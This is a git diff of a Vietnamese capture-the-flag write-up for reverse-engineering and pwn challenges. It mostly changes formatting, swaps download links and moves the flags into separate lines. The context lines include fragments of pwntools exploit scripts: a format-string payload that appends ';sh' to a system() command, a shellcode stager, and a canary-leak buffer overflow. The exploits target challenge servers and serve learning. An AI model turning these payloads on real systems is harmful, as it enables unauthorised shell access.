@@ -19,15 +19,15 @@ img {
 }
 </style>
 
-## **rev/two-faces (0 solve)** 
+## rev/two-faces (0 solve) 
 
 {{< admonition note "Challenge Information" >}}
 * 0 solve / 500 pts / by sonx
-* **Given files:** [rev_two_faces.rar](https://wru-my.sharepoint.com/:f:/g/personal/2251272678_e_tlu_edu_vn/EsSV4QVyTopIl_6UT65as80B4l8qKmfDx9c_ydgtqJYA9g?e=rEZ5wF)
+* **Given files:** [rev_two_faces.rar](https://drive.google.com/file/d/1orBg8bpZNYDnack5IGlZeXltRlmsJ34_/view?usp=sharing)
 * **Description:** Don’t judge a book by its cover.
 {{< /admonition >}}
 
-### **0x01 Overview**
+### 0x01 Overview
 
 Nội dung hàm `main` sau khi đã được rename các hàm, các biến 
 
@@ -166,7 +166,7 @@ Sau khi debug rồi quan sát output, ta sẽ biết được chức năng của
 
 **Bước 5:** Sau 100 round encrypt ở trên, `Block` thu được sẽ đem đi so sánh với chuỗi `FDA6FF91ADA0FDB7ABA9FB91EFAFFAA2`
 
-### **0x02 Getting fake flag**
+### 0x02 Fake flag
 
 Mấu chốt để giải bài này nằm ở việc phải đi viết lại 4 hàm decrypt ở trên. Đây là code giải mã của mình cho 4 hàm phía trên. 
 
@@ -237,7 +237,7 @@ if __name__ == "__main__":
 
 Mình thử chạy lại chương trình với flag thu được `KCSC{3a5y_ch41leng3_!}` nhưng kết quả sai.
 
-### **0x03 Anti Debug - Hooking**
+### 0x03 Anti Debug - Hooking
 
 Sau khi trace lại từ đâu, có một hàm tên là `TlsCallback_0_0` được chạy trước cả hàm `main`
 
@@ -369,7 +369,7 @@ int __cdecl sub_FD61D0(char *input, char *cmpInput)
 }
 ```
 
-Tới đây thì rõ ràng rồi, `cmpInput` bị xor với mảng `buf` rồi mới được đem đi so sánh với `input` của chúng ta. Mình chỉ cần xor ngược lại là có thể giải được bài toán và thu được flag `KCSC{function_h00k1ng}`.
+Tới đây thì rõ ràng rồi, `cmpInput` bị xor với mảng `buf` rồi mới được đem đi so sánh với `input` của chúng ta. Mình chỉ cần xor ngược lại là có thể giải được bài toán và thu được flag.
 
 ```python
 def unShiftRow(blk):
@@ -440,15 +440,17 @@ if __name__ == "__main__":
     main()
 ```
 
-## **rev/dynamic function (2 solves)**
+> **FLAG: KCSC{function_h00k1ng}**
+
+## rev/dynamic function (2 solves)
 
 {{< admonition note "Challenge Information" >}}
 * 2 solves / 496 pts / by sonx
-* **Given files:** [rev_dynamic_function.rar](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ETVhfCJRyjVIvM5yXMjStCIBPyIrWi8w6G4oQBTK6HfN1g?e=VrmuZg)
+* **Given files:** [rev_dynamic_function.rar](https://drive.google.com/file/d/1j_Mxy7pUVHLF2aDL8lTNs2mNYIiFNAu5/view?usp=sharing)
 * **Description:** Unless I am in motion, I remain invisible.
 {{< /admonition >}}
 
-### **0x01 Overview**
+### 0x01 Overview
 
 Decompile file exe bằng IDA64, sau khi đổi tên các hàm, các biến, chúng ta thu được hàm `main()` như sau 
 
@@ -567,7 +569,7 @@ for ( j = 0; j < strlen1(subInput); ++j )
 }
 ```
 
-### **0x02 Dynamic Analysis**
+### 0x02 Dynamic Analysis
 
 Sau bản tóm tắt trên, mấu chốt của bài toán nằm ở đoạn code gọi hàm động `lpAddress`. Chúng ta cần phải biết nó thực sự đã làm gì với `input` ban đầu. 
 
@@ -634,7 +636,7 @@ int __cdecl sub_DF0000(char *subInput, char *output, int subInputLength)
 
 Đoạn encrypt trên rất ngắn gọn, swap 4 bit trước với 4 bit sau của 1 byte. Ví dụ `0x61` → `0x16`
 
-Tiếp theo sẽ xor kết quả trên với mảng `buf` rồi đi so sánh với `expectedOutput`. Chúng ta dễ dàng viết được code giải mã và thu được flag `KCSC{correct_flag!submit_now!}`
+Tiếp theo sẽ xor kết quả trên với mảng `buf` rồi đi so sánh với `expectedOutput`. Chúng ta dễ dàng viết được code giải mã và thu được flag. 
 
 ```python
 buf = [0x72, 0x65, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x70, 0x72, 0x65, 0x74, 0x74, 0x79, 0x5F, 0x63, 0x6F, 0x6F, 0x6C]
@@ -649,6 +651,7 @@ flag += "}"
 
 print(flag)
 ```
+> **FLAG: KCSC{correct_flag!submit_now!}**
 
 <!-- begin cmt rev -->
 <!-- 
@@ -1040,16 +1043,16 @@ Kiểm tra hàm `secret`, ta có được phần giữa của flag là `for_the_
 
 Flag đầy đủ của bài toán là `KCSC{A_gift_for_the_pwners_0xdeadbeef}` -->
 
-## **pwn/Format (0 solve)**
+## pwn/Format (0 solve)
 
 {{< admonition note "Challenge Information" >}}
 * 0 solve / 500 pts / by Nuuuuuuuu
-* **Given files:** [format.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EbjKR1jipvdJm4ZWwXLa2BoBNfwJJSKf2qcXOf8r3JsC7w?e=mpBn7N)
+* **Given files:** [format.zip](https://drive.google.com/file/d/1POj6z-nqeOGUUeig7dRwd-K9bbLf0_SA/view?usp=sharing)
 * **Description:** You don't have to do anything, i will printf the flag for you^^\
 `nc 103.162.14.116 12001`
 {{< /admonition >}}
 
-### **0x01 Finding the bug**
+### 0x01 Finding the bug
 
 Load file vào IDA64, dễ thấy có lỗ hổng FMT ở dòng `printf(buf)`
 
@@ -1068,7 +1071,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-### **0x02 Exploiting FMT bug**
+### 0x02 Exploiting FMT bug
 
 Chương trình gọi hàm `system` với `cmd` là một câu lệnh echo. Ý tưởng để giải bài này sẽ là tận dụng bug FMT viết thêm chuỗi `;sh` sau câu lệnh đó để lấy shell. 
 
@@ -1088,19 +1091,20 @@ pay = f"%{sh}c%10$n".encode().ljust(0x10, b"\x00") + p64(write_addr)
 p.sendline(pay)
 
 p.interactive()
-# KCSC{F1rs1_Pr0b13m_w1Th_pR1Ntf}
 ```
 
-## **pwn/pwn1 (0 solve)**
+> **FLAG: KCSC{F1rs1_Pr0b13m_w1Th_pR1Ntf}**
+
+## pwn/pwn1 (0 solve)
 
 {{< admonition note "Challenge Information" >}}
 * 0 solve / 500 pts
-* **Given files:** [pwn1](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EeNv7B6LlU1Cm8xv11c8j14B53DaHhiI_rNmTx9wNTGQrg?e=kV9ns4)
+* **Given files:** [pwn1](https://drive.google.com/file/d/1hQrWU_jojzUYqkxHMRGCaOHq1VD2mSqK/view?usp=sharing)
 * **Description:** every things start with assembly\
 `nc 103.162.14.116 20001`
 {{< /admonition >}}
 
-### **0x01 Overview**
+### 0x01 Overview
 
 Sử dụng IDA64 decompile chương trình, ta thu được mã giả của hàm `main` như sau 
 
@@ -1123,7 +1127,7 @@ Ta thấy, chương trình `mmap` 1000 byte, bắt đầu tại địa chỉ `0x
 
 Vấn đề ở đây là chúng ta chỉ nhập được tối đa 12 byte. Vậy nên không thể viết trực tiếp shellcode lấy shell như thông thường được. Mình sẽ mở rộng kích thước số byte được nhập ra và gọi lại hàm `read`. 
 
-### **0x02 Final script**
+### 0x02 Final script
 
 ```python
 from pwn import *
@@ -1169,19 +1173,20 @@ time.sleep(2)
 p.sendline(shellcode2)
 
 p.interactive() 
-# KCSC{https://www.youtube.com/watch?v=dQw4w9WgXcQ}
 ```
 
-## **pwn/Simple Overflow (2 solves)**
+> **FLAG: KCSC{https://www.youtube.com/watch?v=dQw4w9WgXcQ}**
+
+## pwn/Simple Overflow (2 solves)
 
 {{< admonition note "Challenge Information" >}}
 * 2 solves / 496 pts / by Nuuuuuuuu
-* **Given files:** [simple_overflow.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EUlfGWaVWGlCikIA45vdnVQBmb8jzs-1yK8KiWvShSwOiQ?e=tm96Lp)
+* **Given files:** [simple_overflow.zip](https://drive.google.com/drive/folders/1ffQAO1KiT0WrPsLQcQG017s_8gS4Np-M?usp=sharing)
 * **Description:** simple description since it’s simple overflow\
 `nc 103.162.14.116 12004`
 {{< /admonition >}}
 
-### **0x01 Finding the bug**
+### 0x01 Finding the bug
 
 Chúng ta có thể thấy sự xuất hiện của lỗ hổng BOF ở hàm `save_data` tại chức năng `read`. 
 
@@ -1225,7 +1230,7 @@ unsigned __int64 __fastcall save_data(const char *a1)
 1. Lần đầu sẽ leak giá trị canary.
 2. Lần thứ hai sẽ overwrite retaddr.
 
-### **0x02 Final script**
+### 0x02 Final script
 
 ```python
 #!/usr/bin/env python3
@@ -1283,8 +1288,9 @@ sa("Data: \n", pay2)
 
 p.interactive() 
 
-# KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g}
 ```
+> **FLAG: KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g}**
+
 <!-- 
 ## pwn/strstr
 
